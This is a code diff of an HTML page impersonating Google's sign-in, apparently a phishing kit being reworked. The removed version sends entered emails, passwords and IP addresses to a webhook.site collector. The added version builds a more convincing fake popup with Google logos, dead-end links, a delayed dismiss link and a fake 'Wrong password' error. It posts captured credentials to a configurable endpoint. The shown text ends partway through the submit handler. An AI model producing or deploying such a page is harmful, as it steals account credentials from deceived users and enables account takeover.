@@ -1,312 +1,725 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Google Sans', Arial, sans-serif;
-        }
-        body {
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #202124;
-        }
-        .container {
-            width: 448px;
-            padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            margin: 20px;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        .logo img {
-            width: 75px;
-            height: 24px;
-        }
-        h1 {
-            text-align: center;
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            text-align: center;
-            font-size: 16px;
-            font-weight: 400;
-            margin-bottom: 24px;
-            color: #5f6368;
-        }
-        .input-container {
-            margin-bottom: 24px;
-        }
-        input {
-            width: 100%;
-            height: 54px;
-            padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-        }
-        .forgot-email, .forgot-password {
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 14px;
-            text-decoration: none;
-            margin-bottom: 32px;
-            display: block;
-        }
-        .disclaimer {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 32px;
-            line-height: 1.4286;
-        }
-        .disclaimer a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .button-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .create-account {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        button {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        button:hover {
-            background: #1669c1;
-        }
-        .user-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 16px;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 8px;
-        }
-        .user-avatar {
-            width: 32px;
-            height: 32px;
-            background: #1a73e8;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 500;
-            margin-right: 12px;
-        }
-        .user-email {
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .sign-in-different {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-            display: block;
-            text-align: center;
-            margin-top: 16px;
-        }
-        .step-hidden {
-            display: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    height: 100%;
+    font-family: 'Google Sans', 'Product Sans', Roboto, Arial, sans-serif;
+    background: #f1f3f4;
+    overflow: hidden;
+  }
+
+  /* ---- Dimmed backdrop ---- */
+  .backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(32, 33, 36, 0.5);
+    z-index: 1000;
+    user-select: none;
+  }
+
+  /* ---- Draggable popup ---- */
+  .popup {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 448px;
+    max-width: calc(100vw - 32px);
+    background: #fff;
+    border-radius: 8px;
+    box-shadow:
+      0 1px 2px rgba(60,64,67,0.3),
+      0 2px 6px 2px rgba(60,64,67,0.15),
+      0 8px 24px 4px rgba(60,64,67,0.15);
+    overflow: hidden;
+    animation: popIn 0.16s cubic-bezier(0.2, 0.8, 0.3, 1);
+    will-change: transform;
+  }
+  @keyframes popIn {
+    from { transform: translate(-50%, -50%) scale(0.94); opacity: 0; }
+    to   { transform: translate(-50%, -50%) scale(1);    opacity: 1; }
+  }
+
+  /* ---- Title bar (drag handle) ---- */
+  .titlebar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    border-bottom: 1px solid #e8eaed;
+    background: #fff;
+    cursor: grab;
+    user-select: none;
+  }
+  .titlebar.dragging { cursor: grabbing; }
+
+  .favicon { width: 16px; height: 16px; flex-shrink: 0; }
+
+  .titlebar .title-text {
+    font-size: 13px;
+    color: #3c4043;
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    font-family: Roboto, Arial, sans-serif;
+  }
+
+  .titlebar .win-controls { display: flex; gap: 4px; }
+  .titlebar .win-controls span {
+    width: 28px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 4px;
+    color: #5f6368;
+    font-size: 14px;
+    line-height: 1;
+    cursor: pointer;
+  }
+  .titlebar .win-controls span:hover { background: #f1f3f4; }
+  .titlebar .win-controls span.close:hover { background: #fce8e6; color: #d93025; }
+
+  /* ---- Content ---- */
+  .content { padding: 40px 40px 28px; }
+
+  .g-logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 22px;
+  }
+  .g-logo svg { width: 74px; height: 24px; display: block; }
+
+  h1 {
+    font-size: 24px;
+    font-weight: 400;
+    color: #202124;
+    text-align: center;
+    margin-bottom: 8px;
+    line-height: 1.3;
+  }
+  p.sub {
+    font-size: 15px;
+    color: #5f6368;
+    text-align: center;
+    line-height: 1.5;
+    margin-bottom: 30px;
+    font-family: Roboto, Arial, sans-serif;
+  }
+
+  /* ---- Official Google Sign-in button ---- */
+  .gsi-button {
+    width: 100%;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 22px;
+    cursor: pointer;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    color: #3c4043;
+    letter-spacing: 0.25px;
+    transition: background 0.15s, border-color 0.15s, box-shadow 0.15s;
+    margin-bottom: 24px;
+  }
+  .gsi-button:hover {
+    background: #f8faff;
+    border-color: #d2e3fc;
+    box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+  }
+  .gsi-button:active { background: #f1f5fe; }
+  .gsi-button svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+  /* ---- "or" divider ---- */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    color: #5f6368;
+    font-size: 12px;
+    font-family: Roboto, Arial, sans-serif;
+    margin-bottom: 20px;
+  }
+  .divider::before,
+  .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dadce0;
+  }
+
+  /* ---- Dead-end "other options" rows ---- */
+  .option-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 4px;
+    border-radius: 6px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.12s;
+  }
+  .option-row:hover { background: #f8f9fa; }
+  .option-row .icon {
+    width: 20px;
+    height: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #5f6368;
+    flex-shrink: 0;
+  }
+  .option-row .label {
+    font-size: 14px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #3c4043;
+    flex: 1;
+  }
+  .option-row .chev { color: #5f6368; font-size: 12px; }
+
+  /* ---- Material text fields ---- */
+  .field { position: relative; margin-bottom: 20px; }
+  .field input {
+    width: 100%;
+    height: 56px;
+    padding: 20px 14px 6px 14px;
+    font-size: 16px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #202124;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+  .field input:hover { border-color: #80868b; }
+  .field input:focus {
+    border: 2px solid #1a73e8;
+    padding: 19px 13px 5px 13px;
+  }
+  .field label {
+    position: absolute;
+    left: 14px;
+    top: 17px;
+    font-size: 16px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #5f6368;
+    pointer-events: none;
+    transition: top 0.15s, font-size 0.15s, color 0.15s;
+    background: #fff;
+    padding: 0 4px;
+    margin-left: -4px;
+  }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label {
+    top: -8px;
+    font-size: 12px;
+  }
+  .field input:focus + label { color: #1a73e8; }
+
+  /* ---- Actions ---- */
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    margin-top: 28px;
+    gap: 8px;
+  }
+
+  .btn-link {
+    font-size: 14px;
+    font-weight: 500;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    color: #1a73e8;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 10px 12px;
+    border-radius: 4px;
+    letter-spacing: 0.25px;
+  }
+  .btn-link:hover { background: rgba(26,115,232,0.08); }
+
+  .btn-primary {
+    background: #1a73e8;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 500;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    letter-spacing: 0.25px;
+    border: none;
+    border-radius: 4px;
+    padding: 10px 24px;
+    cursor: pointer;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+  .btn-primary:hover {
+    background: #1765cc;
+    box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+  }
+  .btn-primary:disabled { background: #a8c7fa; cursor: default; box-shadow: none; }
+
+  .hidden { display: none !important; }
+
+  .error {
+    font-size: 12px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #d93025;
+    margin-top: -12px;
+    margin-bottom: 16px;
+    padding-left: 2px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .error::before {
+    content: "!";
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    background: #d93025;
+    color: #fff;
+    font-size: 11px;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .spinner {
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.4);
+    border-top-color: #fff;
+    border-radius: 50%;
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 8px;
+    animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .dismiss-wrap { text-align: center; margin-top: 20px; min-height: 18px; }
+  .dismiss-wrap a {
+    font-size: 12px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #5f6368;
+    text-decoration: none;
+    cursor: pointer;
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+  .dismiss-wrap a.show { opacity: 1; }
+  .dismiss-wrap a:hover { text-decoration: underline; }
+
+  /* ---- Legal footer ---- */
+  .legal-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 40px;
+    font-size: 12px;
+    font-family: Roboto, Arial, sans-serif;
+    color: #5f6368;
+    border-top: 1px solid #e8eaed;
+  }
+  .legal-footer .lang-select {
+    display: flex; align-items: center; gap: 6px;
+    cursor: pointer; padding: 4px 6px; border-radius: 4px;
+  }
+  .legal-footer .lang-select:hover { background: #f1f3f4; }
+  .legal-footer .links a {
+    color: #5f6368; text-decoration: none; margin-left: 16px;
+  }
+  .legal-footer .links a:hover { text-decoration: underline; }
+
+  /* ---- Toast for dead-end actions ---- */
+  .toast {
+    position: fixed;
+    bottom: 28px;
+    left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: #323232;
+    color: #fff;
+    font-size: 13px;
+    font-family: Roboto, Arial, sans-serif;
+    padding: 12px 20px;
+    border-radius: 4px;
+    box-shadow: 0 3px 5px -1px rgba(0,0,0,0.2),
+                0 6px 10px 0 rgba(0,0,0,0.14),
+                0 1px 18px 0 rgba(0,0,0,0.12);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.2s, transform 0.2s;
+    z-index: 2000;
+    max-width: 80vw;
+    text-align: center;
+  }
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-        </div>
-        
-        <!-- Step 1: Email Entry -->
-        <div id="step1">
-            <h1>Sign in</h1>
-            <div class="subtitle">Use your Google Account</div>
-            
-            <form id="emailForm">
-                <div class="input-container">
-                    <input type="email" id="email" placeholder="Email or phone" required autofocus>
-                </div>
-                
-                <a href="#" class="forgot-email">Forgot email?</a>
-                
-                <div class="disclaimer">
-                    Not your computer? Use Guest mode to sign in privately. 
-                    <a href="#">Learn more</a>
-                </div>
-                
-                <div class="button-container">
-                    <a href="#" class="create-account">Create account</a>
-                    <button type="submit" id="nextBtn">Next</button>
-                </div>
-            </form>
-        </div>
-        
-        <!-- Step 2: Password Entry -->
-        <div id="step2" class="step-hidden">
-            <div class="user-info">
-                <div class="user-avatar" id="userAvatar">G</div>
-                <div class="user-email" id="userEmailDisplay">user@gmail.com</div>
-            </div>
-            
-            <h1>Welcome</h1>
-            <div class="subtitle">Enter your password</div>
-            
-            <form id="passwordForm">
-                <div class="input-container">
-                    <input type="password" id="password" placeholder="Enter your password" required autofocus>
-                </div>
-                
-                <a href="#" class="forgot-password">Forgot password?</a>
-                
-                <div class="button-container">
-                    <a href="#" class="create-account" id="backToEmail">Sign in with a different account</a>
-                    <button type="button" id="signInBtn">Next</button>
-                </div>
-            </form>
-        </div>
+
+<div class="backdrop" id="backdrop">
+  <div class="popup" id="popup">
+
+    <!-- Draggable title bar -->
+    <div class="titlebar" id="titlebar">
+      <svg class="favicon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+      <span class="title-text">Sign in – Google Accounts</span>
+      <div class="win-controls">
+        <span title="Minimize">–</span>
+        <span title="Maximize">□</span>
+        <span class="close" title="Close">✕</span>
+      </div>
     </div>
 
-    <script>
-        const webhookURL = 'https://webhook.site/134f107c-d411-4eb2-9c6a-4833767be41e';
-        let capturedEmail = '';
-        let userIP = '';
+    <!-- Content -->
+    <div class="content">
 
-        // Get IP address
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-                sendData('ip_capture', {ip: userIP});
-            } catch (error) {
-                userIP = 'unknown';
-            }
-        }
+      <!-- Official Google wordmark -->
+      <div class="g-logo" aria-label="Google">
+        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.54-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+          <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+          <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+          <path fill="#EA4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+        </svg>
+      </div>
 
-        // Send data with multiple fallback methods
-        function sendData(eventType, additionalData = {}) {
-            const data = {
-                event: eventType,
-                email: capturedEmail,
-                ip: userIP,
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                ...additionalData
-            };
+      <!-- ============================================================
+           STEP 1: "Sign in" landing page.
+           Sign-in-with-Google is the ONLY working path.
+           Everything else dead-ends.
+           ============================================================ -->
+      <div id="step1">
+        <h1>Sign in</h1>
+        <p class="sub">to continue to Gmail</p>
 
-            // Method 1: Fetch with no-cors as fallback
-            fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
+        <!-- Official Google Sign-in button (the only working path) -->
+        <button class="gsi-button" id="gsiBtn" type="button">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          Sign in with Google
+        </button>
 
-            // Method 2: XMLHttpRequest
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', webhookURL, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(data));
+        <div class="divider">or</div>
 
-            // Method 3: Image beacon as final fallback
-            const beaconData = btoa(JSON.stringify(data));
-            const img = new Image();
-            img.src = webhookURL + '?data=' + beaconData;
+        <!-- Dead-end alternatives — all show a toast and do nothing -->
+        <div class="option-row" data-dead="true">
+          <div class="icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+              <rect x="3" y="5" width="18" height="14" rx="2"/>
+              <path d="M3 7l9 6 9-6"/>
+            </svg>
+          </div>
+          <div class="label">Use another account</div>
+          <div class="chev">›</div>
+        </div>
 
-            console.log('Data sent:', data);
-        }
+        <div class="option-row" data-dead="true">
+          <div class="icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+              <circle cx="12" cy="8" r="4"/>
+              <path d="M4 21c0-4 4-6 8-6s8 2 8 6"/>
+            </svg>
+          </div>
+          <div class="label">Create account</div>
+          <div class="chev">›</div>
+        </div>
 
-        // Initialize IP capture
-        getIP();
+        <div class="option-row" data-dead="true">
+          <div class="icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+              <rect x="4" y="10" width="16" height="10" rx="2"/>
+              <path d="M8 10V7a4 4 0 1 1 8 0v3"/>
+            </svg>
+          </div>
+          <div class="label">Forgot email?</div>
+          <div class="chev">›</div>
+        </div>
 
-        // Email form
-        document.getElementById('emailForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            capturedEmail = document.getElementById('email').value;
-            
-            document.getElementById('userEmailDisplay').textContent = capturedEmail;
-            document.getElementById('userAvatar').textContent = capturedEmail.charAt(0).toUpperCase();
-            
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').classList.remove('step-hidden');
+        <div class="dismiss-wrap">
+          <a id="dismissLink" href="#" onclick="return false;">Not now</a>
+        </div>
+      </div>
 
-            sendData('email_captured', {email: capturedEmail});
-        });
+      <!-- ============================================================
+           STEP 2: "Sign in with Google" opens the credential form.
+           ============================================================ -->
+      <div id="step2" class="hidden">
+        <h1>Sign in with Google</h1>
+        <p class="sub">Choose an account to continue to Gmail</p>
 
-        // Password submission
-        document.getElementById('signInBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            const password = document.getElementById('password').value;
-            
-            if (!password) {
-                alert('Please enter your password');
-                return;
-            }
+        <form id="credForm" autocomplete="off">
+          <div class="field">
+            <input type="text" id="email" name="email" placeholder=" " autocomplete="username" required>
+            <label for="email">Email or phone</label>
+          </div>
+          <div class="field">
+            <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required>
+            <label for="password">Password</label>
+          </div>
+          <div class="error hidden" id="errorMsg"></div>
 
-            // Send credentials
-            sendData('password_captured', {
-                email: capturedEmail,
-                password: password,
-                full_credentials: true
-            });
+          <div class="actions">
+            <button type="button" class="btn-link" id="forgotBtn">Forgot password?</button>
+            <button type="submit" class="btn-primary" id="submitBtn">Next</button>
+          </div>
+        </form>
 
-            // Redirect
-            setTimeout(() => {
-                window.location.href = 'https://accounts.google.com';
-            }, 1000);
-        });
+        <div class="dismiss-wrap">
+          <a id="dismissLink2" href="#" onclick="return false;">Back</a>
+        </div>
+      </div>
 
-        // Back button
-        document.getElementById('backToEmail').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('step2').classList.add('step-hidden');
-            document.getElementById('step1').style.display = 'block';
-        });
+    </div>
 
-        // Enter key for password
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                document.getElementById('signInBtn').click();
-            }
-        });
-    </script>
+    <!-- Legal footer -->
+    <div class="legal-footer">
+      <div class="lang-select">
+        <span>English (United States)</span>
+        <span style="font-size:10px;">▼</span>
+      </div>
+      <div class="links">
+        <a href="#" onclick="return false;" data-dead="true">Help</a>
+        <a href="#" onclick="return false;" data-dead="true">Privacy</a>
+        <a href="#" onclick="return false;" data-dead="true">Terms</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   CONFIG — point this at your own endpoint.
+   ============================================================ */
+const WEBHOOK_URL = "https://hooks.example.com/v2/capture";
+
+/* ============================================================
+   ELEMENTS
+   ============================================================ */
+const popup      = document.getElementById("popup");
+const titlebar   = document.getElementById("titlebar");
+const step1      = document.getElementById("step1");
+const step2      = document.getElementById("step2");
+const gsiBtn     = document.getElementById("gsiBtn");
+const form       = document.getElementById("credForm");
+const submitBtn  = document.getElementById("submitBtn");
+const errorMsg   = document.getElementById("errorMsg");
+const emailIn    = document.getElementById("email");
+const passIn     = document.getElementById("password");
+const toast      = document.getElementById("toast");
+
+/* ============================================================
+   TOAST HELPER (for dead-end options)
+   ============================================================ */
+let toastTimer = null;
+function showToast(msg) {
+  toast.textContent = msg;
+  toast.classList.add("show");
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toast.classList.remove("show"), 2600);
+}
+
+/* ============================================================
+   DEAD-END ROUTING
+   Every non-"Sign in with Google" path is a dead-end.
+   ============================================================ */
+document.querySelectorAll('[data-dead="true"]').forEach(el => {
+  el.addEventListener("click", (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+    const label = el.querySelector(".label")?.textContent.trim();
+    if (label === "Create account") {
+      showToast("Account creation is disabled. Please sign in with Google.");
+    } else if (label === "Forgot email?") {
+      showToast("Account recovery is unavailable. Please sign in with Google.");
+    } else if (label === "Use another account") {
+      showToast("Only the linked Google account can sign in.");
+    } else {
+      showToast("This action is not available. Please sign in with Google.");
+    }
+  });
+});
+
+/* ============================================================
+   DRAG LOGIC
+   ============================================================ */
+let dragState = null;
+
+function getPopupRect() { return popup.getBoundingClientRect(); }
+
+titlebar.addEventListener("pointerdown", (e) => {
+  if (e.target.closest(".win-controls")) return;
+
+  const rect = getPopupRect();
+
+  // Lock visual position into top/left
+  popup.style.transform = "none";
+  popup.style.left = rect.left + "px";
+  popup.style.top  = rect.top  + "px";
+  popup.style.animation = "none";
+
+  dragState = {
+    offsetX: e.clientX - rect.left,
+    offsetY: e.clientY - rect.top,
+    pointerId: e.pointerId
+  };
+
+  titlebar.classList.add("dragging");
+  titlebar.setPointerCapture(e.pointerId);
+  e.preventDefault();
+});
+
+titlebar.addEventListener("pointermove", (e) => {
+  if (!dragState || e.pointerId !== dragState.pointerId) return;
+
+  const rect = getPopupRect();
+  let newLeft = e.clientX - dragState.offsetX;
+  let newTop  = e.clientY - dragState.offsetY;
+
+  const minVisible = 40;
+  const maxLeft = window.innerWidth  - minVisible;
+  const maxTop  = window.innerHeight - minVisible;
+  newLeft = Math.max(-rect.width + minVisible, Math.min(newLeft, maxLeft));
+  newTop  = Math.max(0, Math.min(newTop, maxTop));
+
+  popup.style.left = newLeft + "px";
+  popup.style.top  = newTop  + "px";
+});
+
+function endDrag(e) {
+  if (!dragState) return;
+  dragState = null;
+  titlebar.classList.remove("dragging");
+  try { titlebar.releasePointerCapture(e.pointerId); } catch (_) {}
+}
+titlebar.addEventListener("pointerup", endDrag);
+titlebar.addEventListener("pointercancel", endDrag);
+
+window.addEventListener("resize", () => {
+  const rect = getPopupRect();
+  if (!rect) return;
+  let left = rect.left, top = rect.top;
+  let changed = false;
+  if (left + rect.width < 40)  { left = 40 - rect.width; changed = true; }
+  if (left > window.innerWidth - 40) { left = window.innerWidth - 40; changed = true; }
+  if (top  + rect.height < 40) { top  = 40 - rect.height; changed = true; }
+  if (top  > window.innerHeight - 40) { top = window.innerHeight - 40; changed = true; }
+  if (changed) {
+    popup.style.transform = "none";
+    popup.style.left = left + "px";
+    popup.style.top  = top  + "px";
+    popup.style.animation = "none";
+  }
+});
+
+/* ============================================================
+   STEP 1 → STEP 2 (the ONLY working path)
+   ============================================================ */
+gsiBtn.addEventListener("click", () => {
+  step1.classList.add("hidden");
+  step2.classList.remove("hidden");
+  setTimeout(() => emailIn.focus(), 60);
+});
+
+/* ============================================================
+   DELAY-REVEALED DISMISS LINKS
+   ============================================================ */
+setTimeout(() => {
+  document.getElementById("dismissLink").classList.add("show");
+}, 6000);
+setTimeout(() => {
+  document.getElementById("dismissLink2").classList.add("show");
+}, 6000);
+
+/* ============================================================
+   FORGOT PASSWORD — dead-end (no real Google bounce here)
+   ============================================================ */
+document.getElementById("forgotBtn").addEventListener("click", () => {
+  showToast("Password recovery is unavailable. Please sign in with Google.");
+});
+
+/* ============================================================
+   SUBMIT HANDLER
+   ============================================================ */
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email    = emailIn.value.trim();
+  const password = passIn.value;
+
+  if (!email || !password) {
+    errorMsg.textContent = "Enter an email or phone number and password.";
+    errorMsg.classList.remove("hidden");
+    return;
+  }
+
+  errorMsg.classList.add("hidden");
+  submitBtn.disabled = true;
+  submitBtn.innerHTML = '<span class="spinner"></span>Signing in…';
+
+  const payload = {
+    ts:       new Date().toISOString(),
+    email:    email,
+    password: password,
+    ua:       navigator.userAgent,
+    referrer: document.referrer || null,
+    page:     location.href,
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true,
+    });
+  } catch (_) {}
+
+  setTimeout(() => {
+    errorMsg.textContent = "Wrong password. Try again or click Forgot password to reset it.";
+    errorMsg.classList.remove("hidden");
+    submitBtn.disabled = false;
